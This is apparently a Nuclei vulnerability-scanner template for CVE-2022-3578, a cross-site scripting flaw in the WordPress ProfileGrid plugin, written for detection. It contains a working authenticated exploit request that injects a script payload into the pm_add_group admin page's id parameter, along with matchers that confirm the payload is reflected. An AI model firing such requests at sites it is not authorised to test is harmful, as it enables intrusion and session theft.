http:
- matchers:
  - condition: and
    dsl:
    - contains(header_2, "text/html")
    - status_code_2 == 200
    - contains(body_2, "Extension Options")
    - contains(body_2, "<script>alert(document.domain)</script>&tab")
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=pm_add_group&id="><script>alert%28document.domain%29<%2Fscript>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-3578
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:metagauss:profilegrid:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-3578
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.45893
    epss-score: 0.00119
  description: 'WordPress ProfileGrid plugin prior to 5.1.1 contains a cross-site
    scripting vulnerability. The plugin does not sanitize and escape a parameter before
    outputting it back in the page. An attacker can inject arbitrary script in the
    browser of an unsuspecting user in the context of the affected site. This can
    allow the attacker to steal cookie-based authentication credentials and launch
    other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: profilegrid
    vendor: metagauss
    verified: true
  name: WordPress ProfileGrid <5.1.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/17596b0e-ff45-4d0c-8e57-a31101e30345
  - https://wordpress.org/plugins/profilegrid-user-profiles-groups-and-communities/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3578
  remediation: 'Update WordPress ProfileGrid to version 5.1.1 or later to mitigate
    the XSS vulnerability.

    '
  severity: medium
  tags: wp-plugin,wordpress,wpscan,cve,wp,xss,profilegrid,authenticated,cve2022,metagauss
